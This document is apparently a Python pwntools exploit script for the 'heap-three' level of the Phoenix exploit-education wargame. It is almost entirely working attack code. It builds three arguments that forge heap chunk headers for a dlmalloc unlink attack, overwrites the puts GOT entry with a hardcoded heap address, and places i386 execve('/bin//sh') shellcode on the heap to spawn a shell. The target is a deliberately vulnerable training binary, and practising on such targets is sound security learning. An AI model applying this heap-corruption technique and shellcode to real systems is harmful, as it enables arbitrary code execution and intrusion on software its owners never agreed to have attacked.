from pwn import *


arch = "i486"


def run(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("cat /tmp/docgil  | /opt/phoenix/" + arch + "/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("/opt/phoenix/" + arch + "/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


def run_with_args(level, args):
    index = 0
    args_string = ""
    for arg in args:
        filename = "/tmp/docgil" + str(index)
        write(filename, arg)
        print("payload"+str(index)+": ")
        print(read(filename))
        args_string += " \"`cat " + filename + "`\""
        index += 1

    io = process("/opt/phoenix/" + arch + "/" + level + args_string, shell=True)
    return io.recvall()


heap_shellcode_adr = pack(0xf7e69010, 32)
puts_got_adr_with_off = pack(0x804c13c-0xc, 32)
current_chunk_size = pack(0x64, 32)
fake_prev_chunk_size = pack(0x11, 32)
prev_chunk_size = pack(0x10, 32)
next_chunk_size = pack(0x10, 32)
next_next_chunk_size = pack(0x11, 32)


# shellcode = "\xCC"*16
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# used to place shell code
arg1 = b""
arg1 += 8 * b"A"
arg1 += shellcode

arg2 = b""
arg2 += 16 * b"B"
# fake prev chunk starts here
# arg2 += b"\x00"*4
arg2 += b"B"*4
arg2 += fake_prev_chunk_size
arg2 += puts_got_adr_with_off
arg2 += heap_shellcode_adr
# current chunk starts here
arg2 += prev_chunk_size
arg2 += current_chunk_size
# used to set size of next chunk to prevent code that is executed, if next chunks
# prev_in_use bit is not set
arg3 = b""
arg3 += 92*b"C"
arg3 += next_chunk_size
arg3 += 12*b"C"
arg3 += next_next_chunk_size

r = run_with_args("heap-three", [arg1, arg2, arg3])
print(r)
